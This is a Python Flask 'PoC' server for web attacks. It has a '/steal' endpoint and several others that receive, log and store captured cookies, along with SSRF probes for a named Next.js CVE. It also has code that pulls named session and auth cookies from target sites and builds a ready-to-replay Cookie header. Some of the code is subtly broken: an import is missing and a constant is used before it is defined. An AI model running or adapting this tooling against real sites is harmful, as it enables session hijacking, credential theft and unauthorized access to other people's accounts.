from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import os, time, json, requests
import uuid
from datetime import datetime
from urllib.parse import urljoin, urlparse

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

# ============================================================================
# n8n CONFIGURATION - UPDATE THESE!
# ============================================================================
# Get your production webhook URL from n8n:
# 1. Activate your workflow (toggle from listening → active)
# 2. Copy the "Production URL" from the webhook node
# 3. It should look like: http://localhost:5678/webhook/YOUR-UUID

N8N_CANARY_WEBHOOK = "http://localhost:5678/webhook-test/cookie-capture"  # UPDATE THIS!
N8N_QUERY_WEBHOOK = "http://localhost:5678/webhook-test/check-hits"    # UPDATE THIS!

# In-memory storage as fallback (if n8n query fails)
canary_hits = {}
cookie_cache = {}

def generate_canary_url(test_id=None):
    """Generate unique canary URL with test identifier"""
    if not test_id:
        test_id = str(uuid.uuid4())[:8]
    
    # Append test_id as query parameter
    canary_url = f"{N8N_QUERY_WEBHOOK}?test_id={test_id}&ts={int(time.time())}"
    
    # Initialize hit tracking
    canary_hits[test_id] = {
        'hits': [],
        'created_at': time.time()
    }
    
    return canary_url, test_id

def test_n8n_connectivity():
    """Test if n8n webhooks are active and responding"""
    print("\n" + "="*70)
    print("Testing n8n connectivity...")
    print("="*70)
    
    # Test canary webhook
    try:
        test_id = "connectivity-test"
        print(f"→ Testing canary: {N8N_QUERY_WEBHOOK}")
        resp = requests.get(
            N8N_QUERY_WEBHOOK,
            params={'test_id': test_id},
            timeout=5
        )
        if resp.ok:
            print(f"  ✓ Canary webhook is ACTIVE and responding")
            print(f"    Response: {resp.json()}")
        else:
            print(f"  ✗ Canary returned status {resp.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"  ✗ Cannot connect to canary webhook")
        print(f"    Make sure n8n is running and workflow is ACTIVE (green toggle)")
    except Exception as e:
        print(f"  ✗ Error: {e}")
    
    # Test query webhook
    try:
        print(f"→ Testing query: {N8N_QUERY_WEBHOOK}")
        resp = requests.get(
            N8N_QUERY_WEBHOOK,
            params={'test_id': test_id},
            timeout=5
        )
        if resp.ok:
            print(f"  ✓ Query webhook is ACTIVE and responding")
            data = resp.json()
            print(f"    Hit count: {data.get('hit_count', 0)}")
        else:
            print(f"  ✗ Query returned status {resp.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"  ✗ Cannot connect to query webhook")
        print(f"    Make sure n8n is running and workflow is ACTIVE (green toggle)")
    except Exception as e:
        print(f"  ✗ Error: {e}")
    
    print("="*70 + "\n")

def check_n8n_canary_hits(test_id, wait_time=3):
    """
    Query n8n to check if canary URL was hit
    
    Args:
        test_id: Unique identifier for this test
        wait_time: Seconds to wait before checking (for SSRF to complete)
    
    Returns:
        dict with hit count and details
    """
    print(f"⏳ Waiting {wait_time}s for potential SSRF callback...")
    time.sleep(wait_time)
    
    result = {
        'hitTotal': 0,
        'uniqueIPs': 0,
        'hits': [],
        'timestamps': [],
        'method': 'n8n_query',
        'n8n_status': None
    }
    
    try:
        # Try querying n8n workflow
        print(f"🔍 Querying n8n webhook: {N8N_QUERY_WEBHOOK}?test_id={test_id}")
        
        response = requests.get(
            N8N_QUERY_WEBHOOK,
            params={'test_id': test_id},
            timeout=10
        )
        
        result['n8n_status'] = response.status_code
        
        if response.ok:
            data = response.json()
            result.update({
                'hitTotal': data.get('hit_count', 0),
                'uniqueIPs': len(data.get('unique_ips', [])),
                'hits': data.get('hits', []),
                'timestamps': data.get('timestamps', []),
                'method': 'n8n_query_success',
                'n8n_response': data
            })
            print(f"✓ n8n query successful: {result['hitTotal']} hit(s)")
            return result
        else:
            print(f"⚠ n8n query failed with status {response.status_code}")
            print(f"   Response: {response.text[:200]}")
            result['n8n_error'] = response.text[:200]
            
    except requests.exceptions.ConnectionError as e:
        print(f"⚠ Cannot connect to n8n at {N8N_QUERY_WEBHOOK}")
        print(f"   Error: {e}")
        print(f"   SOLUTION: Make sure n8n workflow is ACTIVE (green toggle in top-right)")
        print(f"   The workflow must be in production mode, not 'listening for test event'")
        result['n8n_error'] = 'Connection refused - n8n may not be active'
    except Exception as e:
        print(f"⚠ Error querying n8n: {e}")
        result['n8n_error'] = str(e)
    
    # Fallback: Check in-memory storage
    if test_id in canary_hits:
        hits = canary_hits[test_id]['hits']
        unique_ips = list(set([h.get('ip', 'unknown') for h in hits]))
        result.update({
            'hitTotal': len(hits),
            'uniqueIPs': len(unique_ips),
            'hits': hits,
            'timestamps': [h.get('timestamp') for h in hits],
            'method': 'fallback_memory'
        })
        print(f"✓ Fallback check: {result['hitTotal']} hit(s) in memory")
    else:
        print(f"⚠ No hits found in fallback memory either")
    
    return result

@app.route('/set')
def set_session():
    resp = make_response(jsonify({"status":"ok"}))
    resp.set_cookie('session', 'secret', httponly=True, secure=True, samesite='Lax', path='/')
    return resp

# ============================================================================
# FALLBACK CANARY ENDPOINT (if n8n fails)
# ============================================================================
@app.route('/canary', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def fallback_canary():
    """Fallback canary endpoint in case n8n isn't available"""
    test_id = request.args.get('test_id', 'unknown')
    
    hit_data = {
        'test_id': test_id,
        'timestamp': datetime.utcnow().isoformat(),
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', ''),
        'method': request.method,
        'path': request.path,
        'full_url': request.url,
        'headers': dict(request.headers)
    }
    
    # Store in memory
    if test_id not in canary_hits:
        canary_hits[test_id] = {'hits': [], 'created_at': time.time()}
    
    canary_hits[test_id]['hits'].append(hit_data)
    
    print(f"\n🎯 CANARY HIT DETECTED!")
    print(f"   Test ID: {test_id}")
    print(f"   IP: {hit_data['ip']}")
    print(f"   User-Agent: {hit_data['user_agent']}")
    print(f"   Method: {hit_data['method']}\n")
    
    return jsonify({'status': 'logged', 'test_id': test_id})

# ============================================================================
# MAIN ENDPOINTS
# ============================================================================

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    cookies = data.get('cookies') if data else None
    if cookies:
        print(f"Received cookies: {cookies}")  # Log cookies server-side
    else:
        print("No cookies received")
    # Respond with minimal JSON - can be empty since client doesn't require response body
    return jsonify({"status": "success"}), 200

@app.route('/proxy/get-cookies', methods=['POST'])
def proxy_get_cookies():
    data = request.get_json(force=True)
    target_origin = data.get('targetOrigin')
    path = data.get('path', '/')
    method = data.get('method', 'GET')

    if not target_origin:
        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400

    try:
        target_url = target_origin.rstrip('/') + path
        r = requests.request(method, target_url, allow_redirects=False, timeout=15)

        # Get raw Set-Cookie headers
        raw_setcookie_list = []
        if hasattr(r.headers, 'getlist'):
            raw_setcookie_list = r.headers.getlist('Set-Cookie')
        else:
            for k, v in r.headers.items():
                if k.lower() == 'set-cookie':
                    raw_setcookie_list.append(v)

        parsed_cookies = [{'name': c.name, 'value': c.value} for c in r.cookies]

        return jsonify({
            'ok': True,
            'status': r.status_code,
            'raw_setcookie': raw_setcookie_list,
            'cookies': parsed_cookies,
            'headers': dict(r.headers)
        })

    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/test-n8n', methods=['GET'])
def test_n8n_endpoint():
    """Endpoint to test n8n connectivity from browser"""
    test_n8n_connectivity()
    
    # Try to hit canary and query it
    test_id = f"test-{int(time.time())}"
    
    results = {
        'test_id': test_id,
        'canary_hit': False,
        'canary_response': None,
        'query_response': None,
        'errors': []
    }
    
    # Hit canary
    try:
        resp = requests.get(
            N8N_QUERY_WEBHOOK,
            params={'test_id': test_id},
            timeout=5
        )
        if resp.ok:
            results['canary_hit'] = True
            results['canary_response'] = resp.json()
    except Exception as e:
        results['errors'].append(f"Canary error: {e}")
    
    # Wait and query
    time.sleep(2)
    try:
        resp = requests.get(
            N8N_QUERY_WEBHOOK,
            params={'test_id': test_id},
            timeout=5
        )
        if resp.ok:
            results['query_response'] = resp.json()
    except Exception as e:
        results['errors'].append(f"Query error: {e}")
    
    return jsonify(results)

@app.route('/log-headers', methods=['POST'])
def log_headers():
    cookie_header = request.headers.get('Cookie')
    if cookie_header:
        # Parse cookies
        cookies = {}
        for c in cookie_header.split(';'):
            c = c.strip()
            if '=' in c:
                name, value = c.split('=', 1)
                cookies[name] = value
        # Store in cache
        for name, value in cookies.items():
            cookie_cache[name] = value
    return jsonify({'status': 'stored', 'cookies': list(cookies.keys())})

@app.route("/")
def index():
    return send_from_directory(".", "monster.html")

@app.route('/probe', methods=['POST'])
def probe_endpoint():
    data = request.get_json(force=True)
    target_origin = data.get('targetOrigin')
    path = data.get('path', '/')
    method = data.get('method', 'GET')
    redact = bool(data.get('redact_cookie_values', True))

    if not target_origin:
        return jsonify({"ok": False, "error": "targetOrigin required"}), 400

    target_url = urljoin(target_origin, path)

    # Preflight attempt (optional)
    preflight = {}
    try:
        pre = requests.options(target_url, headers={"Origin": data.get('attackOrigin', 'https://example.com')}, timeout=6)
        preflight = {"status": pre.status_code, "headers": dict(pre.headers)}
    except Exception as e:
        preflight = {"error": str(e)}

    # perform actual fetch server->target
    res = fetch_target_redacted(target_url, method=method, redact_cookie_values=redact)

    # prepare redacted actual output
    actual_redacted = {
        "status": res.get('status'),
        "response_headers_summary": {k: v for k, v in (res.get('response_headers') or {}).items() if k.lower().startswith('access-control-') or k.lower().startswith('content-') or k.lower().startswith('server') or k.lower().startswith('set-cookie')},
        "set_cookie_count": res.get('set_cookie_count'),
        "set_cookie_names": res.get('set_cookie_names'),
        "body_preview": res.get('body_preview')
    }

    payload = {
        "preflight": preflight,
        "actual_redacted": actual_redacted
    }

    # If caller explicitly asked for non-redacted values and server allows, include them
    if (not redact) and os.environ.get("ALLOW_RAW_COOKIE_VALUES") == "1":
        payload["actual"] = res  # careful: may include raw cookie strings

    return jsonify(payload)

# /notes endpoint — append to local file
@app.route('/notes', methods=['POST'])
def notes_endpoint():
    try:
        data = request.get_json(force=True)
    except:
        return jsonify({"ok": False, "error": "invalid json"}), 400

    record = {
        "timestamp": data.get('timestamp') or time.time(),
        "target": data.get('target'),
        "notes": data.get('notes'),
        "user_agent": data.get('user_agent') or request.headers.get('User-Agent'),
        "ip": request.remote_addr
    }
    try:
        with open(NOTES_FILE, 'a', encoding='utf-8') as fh:
            fh.write(json.dumps(record, ensure_ascii=False) + '\n')
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

    return jsonify({"ok": True, "saved_file": NOTES_FILE})

@app.route('/probe-nextjs-cve-2025-57822', methods=['POST'])
def probe_nextjs_cve():
    """
    Enhanced Next.js CVE-2025-57822 SSRF probe with n8n canary integration
    """
    data = request.get_json(force=True)
    target_origin = data.get('targetOrigin', '')
    test_paths = data.get('testPaths', ['/'])
    
    if not target_origin:
        return jsonify({'error': 'targetOrigin required'}), 400
    
    # Generate unique canary URL for this test
    canary_url, test_id = generate_canary_url()
    
    results = {
        'targetOrigin': target_origin,
        'testId': test_id,
        'timestamp': datetime.utcnow().isoformat(),
        'vulnerable': False,
        'hasMiddleware': False,
        'version': None,
        'tests': [],
        'canary': {
            'url': canary_url,
            'testId': test_id,
            'hitTotal': 0,
            'uniqueIPs': 0,
            'hits': []
        }
    }
    
    print(f"\n{'='*70}")
    print(f"CVE-2025-57822 SSRF Probe Started")
    print(f"{'='*70}")
    print(f"Test ID: {test_id}")
    print(f"Target: {target_origin}")
    print(f"Canary: {canary_url}")
    print(f"{'='*70}\n")
    
    for path in test_paths:
        test_url = target_origin.rstrip('/') + path
        
        # Test 1: Detect middleware presence
        try:
            print(f"Testing: {test_url}")
            r1 = requests.get(
                test_url,
                headers={'User-Agent': f'CVE-2025-57822-Scanner/{test_id}'},
                timeout=10,
                allow_redirects=False
            )
            
            middleware_headers = [
                'x-middleware-preflight',
                'x-middleware-rewrite',
                'x-nextjs-matched-path',
                'x-middleware-next'
            ]
            
            if any(h.lower() in [k.lower() for k in r1.headers.keys()] for h in middleware_headers):
                results['hasMiddleware'] = True
                print(f"  ✓ Middleware detected")
            
            if 'x-powered-by' in r1.headers:
                powered_by = r1.headers['x-powered-by']
                if 'Next.js' in powered_by:
                    results['version'] = powered_by
                    print(f"  ✓ Version: {powered_by}")
            
        except Exception as e:
            print(f"  ✗ Error: {e}")
            continue
        
        # Test 2: SSRF with Location header injection
        try:
            print(f"  → Attempting SSRF with Location: {canary_url}")
            r2 = requests.post(
                test_url,
                headers={
                    'Content-Type': 'application/json',
                    'Location': canary_url,
                    'User-Agent': f'CVE-2025-57822-SSRF/{test_id}'
                },
                json={'test': 'ssrf', 'test_id': test_id},
                timeout=10,
                allow_redirects=False
            )
            
            test_result = {
                'path': path,
                'method': 'POST',
                'status': r2.status_code,
                'vulnerable': False,
                'details': None
            }
            
            if 300 <= r2.status_code < 400:
                test_result['vulnerable'] = True
                test_result['details'] = f"Redirect response ({r2.status_code})"
                results['vulnerable'] = True
                print(f"  ⚠ Redirect detected: {r2.status_code}")
            
            if 'location' in r2.headers:
                returned_location = r2.headers['location']
                if canary_url in returned_location or test_id in returned_location:
                    test_result['vulnerable'] = True
                    test_result['details'] = "Canary URL reflected in Location header"
                    results['vulnerable'] = True
                    print(f"  🚨 Canary URL reflected!")
            
            results['tests'].append(test_result)
            
        except Exception as e:
            print(f"  ✗ SSRF test error: {e}")
            results['tests'].append({
                'path': path,
                'method': 'POST',
                'status': 'error',
                'vulnerable': False,
                'details': str(e)
            })
        
        # Test 3: Various redirect methods
        for status_code in [301, 302, 307, 308]:
            try:
                r3 = requests.get(
                    test_url,
                    headers={
                        'Location': canary_url,
                        'X-Forwarded-Host': urlparse(canary_url).netloc,
                        'User-Agent': f'CVE-2025-57822-{status_code}/{test_id}'
                    },
                    timeout=5,
                    allow_redirects=False
                )
                
                if 'location' in r3.headers and (canary_url in r3.headers['location'] or test_id in r3.headers['location']):
                    results['tests'].append({
                        'path': path,
                        'method': f'GET (injected {status_code})',
                        'status': r3.status_code,
                        'vulnerable': True,
                        'details': 'Canary reflected in Location'
                    })
                    results['vulnerable'] = True
                    print(f"  🚨 Canary reflected with status {status_code}!")
                    
            except Exception as e:
                continue
    
    # Check canary hits via n8n (or fallback)
    print(f"\n{'='*70}")
    canary_results = check_n8n_canary_hits(test_id, wait_time=3)
    results['canary'].update(canary_results)
    
    if canary_results['hitTotal'] > 0:
        print(f"🎯 SSRF CONFIRMED!")
        print(f"   Canary received {canary_results['hitTotal']} hit(s)")
        print(f"   From {canary_results['uniqueIPs']} unique IP(s)")
        print(f"   Detection method: {canary_results['method']}")
        results['vulnerable'] = True
        
        # Show hit details
        for i, hit in enumerate(canary_results['hits'][:3], 1):  # Show first 3
            print(f"   Hit #{i}: {hit.get('ip')} at {hit.get('timestamp')}")
    else:
        print(f"⚠ No canary hits detected")
        print(f"   This doesn't rule out vulnerability - target may have:")
        print(f"   - Network restrictions preventing outbound requests")
        print(f"   - WAF/firewall blocking the SSRF attempt")
        print(f"   - Different vulnerable paths not tested")
    
    print(f"{'='*70}")
    print(f"Probe Complete - Vulnerable: {results['vulnerable']}")
    print(f"{'='*70}\n")
    
    return jsonify(results)

NOTES_FILE = 'notes.log'   # appends JSON lines

def fetch_target_redacted(url, method='GET', headers=None, data=None, redact_cookie_values=True):
    """Perform server->target request, capture headers and cookie names.
       If redact_cookie_values==False and SERVER_ALLOW_RAW is True, include actual values.
    """
    try:
        r = requests.request(method, url, headers=headers or {}, data=data, timeout=10, allow_redirects=True)
    except Exception as e:
        return {"ok": False, "error": str(e)}

    # collect headers
    resp_headers = dict(r.headers)

    # collect set-cookie header(s)
    set_cookie_raw = r.headers.get('Set-Cookie')
    set_cookie_list = []
    if set_cookie_raw:
        # Many frameworks return a single header string; split conservatively by comma if multiple cookies present
        # but be cautious (cookie values can contain commas); for triage this is OK.
        set_cookie_list = [s.strip() for s in set_cookie_raw.split(',') if s.strip()]

    # parse cookie names
    cookie_names = []
    for sc in set_cookie_list:
        # extract cookie-name up to the first "="
        try:
            name = sc.split('=')[0].strip()
            cookie_names.append(name)
        except:
            pass

    body_preview = r.text[:2000] if r.text else ''

    result = {
        "ok": True,
        "status": r.status_code,
        "response_headers": resp_headers,
        "set_cookie_count": len(set_cookie_list),
        "set_cookie_names": cookie_names,
        "body_preview": body_preview
    }

    # Optionally include raw set-cookie strings only if explicitly allowed
    if (not redact_cookie_values) and os.environ.get("ALLOW_RAW_COOKIE_VALUES") == "1":
        result["set_cookie_raw"] = set_cookie_list

    return result


@app.route('/extract-cookies', methods=['POST'])
def extract_cookies():
    """
    Extract specific cookies from target and prepare them for use
    """
    data = request.get_json(force=True)
    target_origin = data.get('targetOrigin')
    path = data.get('path', '/')
    cookie_names = data.get('cookieNames', ['__cf_bm', '_dd_s', 'kdid', 'thx_guid', 'tmx_guid', 'klp_device_id', 'klp_ls_id', 'sessionId', 'session', 'klp_ls_id', 'KC_STATE_CHECKER', 'KC_AUTH_SESSION_HASH', 'aws-waf-token', 'KEYCLOAK_SESSION'])
    
    if not target_origin:
        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400
    
    try:
        target_url = target_origin.rstrip('/') + path
        
        print(f"\n{'='*60}")
        print(f"Extracting cookies from: {target_url}")
        print(f"Target cookies: {', '.join(cookie_names)}")
        print(f"{'='*60}")
        
        # Make request to get cookies
        r = requests.get(
            target_url,
            allow_redirects=True,
            timeout=15,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        # Extract requested cookies
        extracted = {}
        for cookie in r.cookies:
            if cookie.name in cookie_names:
                extracted[cookie.name] = {
                    'value': cookie.value,
                    'domain': cookie.domain,
                    'path': cookie.path,
                    'secure': cookie.secure,
                    'httponly': cookie.has_nonstandard_attr('HttpOnly') or False,
                    'sameSite': cookie.get_nonstandard_attr('SameSite', 'None')
                }
                print(f"✓ Extracted: {cookie.name}")
                print(f"  Value: {cookie.value[:30]}...")
                print(f"  HttpOnly: {extracted[cookie.name]['httponly']}")
                print(f"  Secure: {extracted[cookie.name]['secure']}")
        
        missing = set(cookie_names) - set(extracted.keys())
        if missing:
            print(f"⚠ Missing cookies: {', '.join(missing)}")
        
        print(f"{'='*60}\n")
        
        # Format for easy reuse
        cookie_header = '; '.join([f"{name}={data['value']}" for name, data in extracted.items()])
        
        return jsonify({
            'ok': True,
            'extracted_cookies': extracted,
            'cookie_header': cookie_header,  # Ready-to-use Cookie header value
            'found_count': len(extracted),
            'missing_cookies': list(missing)
        })
        
    except Exception as e:
        print(f"✗ Error: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500

# Add this endpoint to your app.py (after the existing endpoints)

@app.route('/collect-evidence', methods=['POST'])
def collect_evidence():
    """
    Collect evidence from enhanced cookie injection tests
    Stores results and optionally forwards to n8n webhook
    """
    data = request.get_json(force=True)
    evidence_type = data.get('type', 'unknown')
    timestamp = data.get('timestamp')
    test_data = data.get('data', {})
    metadata = data.get('metadata', {})
    
    # Generate unique evidence ID
    evidence_id = f"{evidence_type}-{int(time.time())}-{str(uuid.uuid4())[:8]}"
    
    print(f"\n{'='*70}")
    print(f"📥 EVIDENCE RECEIVED: {evidence_type}")
    print(f"{'='*70}")
    print(f"Evidence ID: {evidence_id}")
    print(f"Timestamp: {timestamp}")
    print(f"User Agent: {metadata.get('userAgent', 'unknown')}")
    
    # Log key details
    if evidence_type == 'cookie_injection_evidence':
        print(f"\nCookie Injection Test:")
        print(f"  Target: {test_data.get('target', 'unknown')}")
        print(f"  Success: {test_data.get('success', False)}")
        print(f"  Cookie: {test_data.get('cookieName', 'unknown')}")
        
        if test_data.get('response'):
            print(f"  Status: {test_data['response'].get('status', 'N/A')}")
            
        if test_data.get('timing'):
            print(f"  Timing: {test_data['timing'].get('total', 0):.2f}ms")
            
        if test_data.get('vectors'):
            print(f"  Vectors tested: {len(test_data.get('vectors', []))}")
            successful_vectors = [v['name'] for v in test_data.get('vectors', []) if v.get('success')]
            if successful_vectors:
                print(f"  Successful: {', '.join(successful_vectors)}")
    
    print(f"{'='*70}\n")
    
    # Save to file
    evidence_record = {
        'evidence_id': evidence_id,
        'type': evidence_type,
        'timestamp': timestamp,
        'data': test_data,
        'metadata': metadata,
        'received_at': datetime.utcnow().isoformat()
    }
    
    try:
        # Append to evidence log
        with open('cookie_injection_evidence.jsonl', 'a', encoding='utf-8') as f:
            f.write(json.dumps(evidence_record) + '\n')
        
        print(f"✓ Evidence saved to cookie_injection_evidence.jsonl")
        
        # Optionally forward to n8n webhook
        forward_to_n8n = False
        if N8N_CANARY_WEBHOOK and test_data.get('success'):
            try:
                webhook_payload = {
                    'event': 'cookie_injection_success',
                    'evidence_id': evidence_id,
                    'timestamp': timestamp,
                    'target': test_data.get('target'),
                    'cookie_name': test_data.get('cookieName'),
                    'status': test_data.get('response', {}).get('status'),
                    'cors_headers': test_data.get('response', {}).get('corsHeaders', {}),
                    'metadata': metadata
                }
                
                webhook_response = requests.post(
                    N8N_CANARY_WEBHOOK,
                    json=webhook_payload,
                    timeout=5
                )
                
                if webhook_response.ok:
                    print(f"✓ Evidence forwarded to n8n webhook")
                    forward_to_n8n = True
                else:
                    print(f"⚠ n8n webhook returned {webhook_response.status_code}")
                    
            except Exception as e:
                print(f"⚠ n8n webhook failed: {e}")
        
        return jsonify({
            'ok': True,
            'evidence_id': evidence_id,
            'saved_to': 'cookie_injection_evidence.jsonl',
            'webhook_forwarded': forward_to_n8n
        })
        
    except Exception as e:
        print(f"✗ Error saving evidence: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500


@app.route('/get-evidence', methods=['GET'])
def get_evidence():
    """
    Retrieve collected evidence
    """
    try:
        if not os.path.exists('cookie_injection_evidence.jsonl'):
            return jsonify({'ok': True, 'evidence': [], 'count': 0})
        
        evidence = []
        with open('cookie_injection_evidence.jsonl', 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    evidence.append(json.loads(line))
        
        # Optional: Filter by type
        evidence_type = request.args.get('type')
        if evidence_type:
            evidence = [e for e in evidence if e.get('type') == evidence_type]
        
        # Optional: Limit results
        limit = request.args.get('limit', type=int)
        if limit:
            evidence = evidence[-limit:]
        
        return jsonify({
            'ok': True,
            'evidence': evidence,
            'count': len(evidence)
        })
        
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500


@app.route('/evidence-dashboard', methods=['GET'])
def evidence_dashboard():
    """
    Simple HTML dashboard to view collected evidence
    """
    try:
        if not os.path.exists('cookie_injection_evidence.jsonl'):
            evidence = []
        else:
            evidence = []
            with open('cookie_injection_evidence.jsonl', 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip():
                        evidence.append(json.loads(line))
        
        # Generate simple HTML
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Evidence Dashboard</title>
            <style>
                body { font-family: monospace; background: #0a0e1a; color: #d6ffe6; padding: 20px; }
                .evidence { background: #131823; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #1e2837; }
                .success { color: #6ee7b7; }
                .error { color: #fca5a5; }
                .warning { color: #fcd34d; }
                h1 { color: #6ee7b7; }
                h3 { color: #93c5fd; margin-top: 0; }
                pre { background: #0b1020; padding: 10px; border-radius: 4px; overflow-x: auto; }
            </style>
        </head>
        <body>
            <h1>🔒 Cookie Injection Evidence Dashboard</h1>
            <p>Total Evidence Records: <span class="success">""" + str(len(evidence)) + """</span></p>
            <hr>
        """
        
        for i, e in enumerate(reversed(evidence), 1):
            data = e.get('data', {})
            success = data.get('success', False)
            status_class = 'success' if success else 'error'
            
            html += f"""
            <div class="evidence">
                <h3>Evidence #{i} - {e.get('evidence_id', 'unknown')}</h3>
                <p><strong>Type:</strong> {e.get('type', 'unknown')}</p>
                <p><strong>Timestamp:</strong> {e.get('timestamp', 'N/A')}</p>
                <p><strong>Target:</strong> {data.get('target', 'N/A')}</p>
                <p><strong>Success:</strong> <span class="{status_class}">{success}</span></p>
                <p><strong>Cookie:</strong> {data.get('cookieName', 'N/A')}</p>
            """
            
            if data.get('response'):
                html += f"""<p><strong>Response Status:</strong> {data['response'].get('status', 'N/A')}</p>"""
                
                if data['response'].get('corsHeaders'):
                    html += f"""
                    <p><strong>CORS Headers:</strong></p>
                    <pre>{json.dumps(data['response']['corsHeaders'], indent=2)}</pre>
                    """
            
            if data.get('timing'):
                html += f"""
                <p><strong>Timing:</strong> 
                   Injection: {data['timing'].get('injection', 0):.2f}ms, 
                   Request: {data['timing'].get('request', 0):.2f}ms, 
                   Total: {data['timing'].get('total', 0):.2f}ms
                </p>
                """
            
            if data.get('vectors'):
                successful = [v['name'] for v in data['vectors'] if v.get('success')]
                html += f"""<p><strong>Successful Vectors:</strong> {', '.join(successful) if successful else 'None'}</p>"""
            
            if data.get('error'):
                html += f"""<p class="error"><strong>Error:</strong> {data['error']}</p>"""
            
            html += """</div>"""
        
        html += """
        </body>
        </html>
        """
        
        return html
        
    except Exception as e:
        return f"<html><body><h1>Error</h1><p>{e}</p></body></html>", 500

@app.route('/test-with-cookies', methods=['POST'])
def test_with_cookies():
    """
    Test endpoint using extracted cookies
    """
    data = request.get_json(force=True)
    target_origin = data.get('targetOrigin')
    test_path = data.get('testPath', '/api/protected')
    cookies = data.get('cookies', {})  # Dict of {cookie_name: cookie_value}
    
    if not target_origin:
        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400
    
    try:
        target_url = target_origin.rstrip('/') + test_path
        
        # Build cookie header
        cookie_header = '; '.join([f"{name}={value}" for name, value in cookies.items()])
        
        print(f"\n{'='*60}")
        print(f"Testing with cookies: {target_url}")
        print(f"Cookies: {cookie_header[:100]}...")
        print(f"{'='*60}")
        
        r = requests.get(
            target_url,
            headers={
                'Cookie': cookie_header,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout=15
        )
        
        print(f"Response: {r.status_code}")
        print(f"{'='*60}\n")
        
        return jsonify({
            'ok': True,
            'status': r.status_code,
            'response_preview': r.text[:500],
            'cookies_sent': list(cookies.keys())
        })
        
    except Exception as e:
        print(f"✗ Error: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/save-evidence', methods=['POST'])
def save_evidence():
    data = request.get_json(force=True)
    print("Evidence received:", len(data.get("lines", [])), "lines")
    
    with open('evidence.txt', 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, indent=2) + '\n')
        f.write('\n' + '='*60 + '\n\n')
    
    return jsonify({"status": "success", "lines": len(data.get("lines", []))})

@app.route('/save-cookies', methods=['POST'])
def save_cookies():
    """
    Save captured cookies to file and optionally forward to webhook
    """
    data = request.get_json(force=True)
    target_origin = data.get('target_origin')
    cookies = data.get('cookies', {})
    timestamp = data.get('timestamp')
    user_agent = data.get('user_agent', 'unknown')
    
    if not cookies:
        return jsonify({'ok': False, 'error': 'No cookies provided'}), 400
    
    print(f"\n{'='*60}")
    print(f"🍪 COOKIES CAPTURED from {target_origin}")
    print(f"{'='*60}")
    print(f"Timestamp: {timestamp}")
    print(f"Cookie Count: {len(cookies)}")
    print(f"\nCookies:")
    for name, value in cookies.items():
        print(f"  {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
    print(f"{'='*60}\n")
    
    # Save to file
    capture_data = {
        'target_origin': target_origin,
        'timestamp': timestamp,
        'user_agent': user_agent,
        'cookies': cookies,
        'cookie_count': len(cookies)
    }
    
    try:
        # Append to JSON lines file
        with open('captured_cookies.jsonl', 'a', encoding='utf-8') as f:
            f.write(json.dumps(capture_data) + '\n')
        
        print(f"✓ Saved to captured_cookies.jsonl")
        
        return jsonify({
            'ok': True,
            'saved_count': len(cookies),
            'saved_to': 'captured_cookies.jsonl'
        })
        
    except Exception as e:
        print(f"✗ Error saving: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500


@app.route('/get-captured-cookies', methods=['GET'])
def get_captured_cookies():
    """
    Retrieve all captured cookies from file
    """
    try:
        if not os.path.exists('captured_cookies.jsonl'):
            return jsonify({'ok': True, 'captures': [], 'count': 0})
        
        captures = []
        with open('captured_cookies.jsonl', 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    captures.append(json.loads(line))
        
        return jsonify({
            'ok': True,
            'captures': captures,
            'count': len(captures)
        })
        
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500


@app.route('/forward-to-webhook', methods=['POST'])
def forward_to_webhook():
    """
    Forward arbitrary data to your n8n webhook
    """
    data = request.get_json(force=True)
    webhook_url = data.get('webhookUrl', N8N_CANARY_WEBHOOK)
    payload = data.get('payload', {})
    
    if not webhook_url:
        return jsonify({'ok': False, 'error': 'webhookUrl required'}), 400
    
    try:
        print(f"\n{'='*60}")
        print(f"📤 Forwarding to webhook: {webhook_url}")
        print(f"Payload size: {len(json.dumps(payload))} bytes")
        print(f"{'='*60}")
        
        r = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        print(f"Response: {r.status_code}")
        print(f"{'='*60}\n")
        
        return jsonify({
            'ok': r.ok,
            'status': r.status_code,
            'response': r.text[:500]
        })
        
    except Exception as e:
        print(f"✗ Webhook error: {e}\n")
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/log-cookies', methods=['POST', 'GET'])
def log_cookies():
    cookies = request.cookies  # Flask provides cookies as a dict
    # Store each cookie in cache
    for name, value in cookies.items():
        cookie_cache[name] = value
    return jsonify({'status': 'stored', 'cookies': list(cookies.keys())})

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "not found", "path": request.path}), 404

if __name__ == "__main__":
    print("\n" + "="*70)
    print("🚀 Flask PoC Server Starting")
    print("="*70)
    print(f"📍 Server: http://127.0.0.1:5000")
